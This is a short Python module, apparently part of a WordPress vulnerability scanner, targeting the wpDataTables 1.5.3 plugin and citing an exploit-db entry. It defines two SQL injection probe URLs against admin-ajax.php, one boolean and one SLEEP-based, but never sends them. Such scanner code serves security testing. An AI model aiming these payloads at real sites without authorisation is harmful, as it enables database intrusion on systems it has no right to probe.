from ..exploitsql import ExploitSql


class WPDataTables(ExploitSql):
	@staticmethod
	def getname():
		return 'wpDataTables'

	@staticmethod
	def getversion():
		return '1.5.3'

	@staticmethod
	def getexploiturl():
		return 'http://www.exploit-db.com/exploits/35340/'

	def exploit(self):
		# TODO Get plugin to test on local server
		name = self.getname()
		version = self.getversion()
		exploit = {
			1: '/wp-admin/admin-ajax.php?action=get_wdtable&table_id=1 AND 9029=9029',
			2: '/wp-admin/admin-ajax.php?action=get_wdtable&table_id=1 AND SLEEP(5)'
		}
		ExploitSql.exploitnotfound(self, name, version)
